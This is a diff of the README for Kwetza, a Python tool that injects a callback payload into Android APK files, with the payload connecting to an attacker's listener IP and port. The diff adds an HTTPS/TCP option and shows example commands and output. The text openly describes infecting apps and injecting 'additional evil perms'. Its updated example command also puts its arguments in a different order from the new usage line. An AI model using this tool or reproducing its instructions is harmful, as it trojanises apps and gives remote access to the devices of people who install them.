@@ -22,15 +22,16 @@ Kwetza requires Apktool to be install and accessible via your PATH. This can be 
 
 # Usage
 
-python kwetza.py nameOfTheApkToInfect.apk LHOST LPORT yes/no
+python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no
 
-* nameOfTheApkToInfect.apk =name of the APK you wish to infect.
-* LHOST =IP of your listener.
-* LPORT =Port of your listener.
-* yes =include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.
+* nameOfTheApkToInfect.apk = name of the APK you wish to infect.
+* https/tcp = select either a HTTPS or TCP connection
+* LHOST = IP of your listener.
+* LPORT = Port of your listener.
+* yes = include "yes" to inject additional evil perms into the app, "no" to utilize the default permissions of the app.
 
 ```
-python kwetza.py hackme.apk 10.42.0.118 4444 yes
+python kwetza.py hackme.apk 10.42.0.118 https 4444 yes
 [+] MMMMMM KWETZA
 [*] DECOMPILING TARGET APK
 [+] ENDPOINT IP: 10.42.0.118
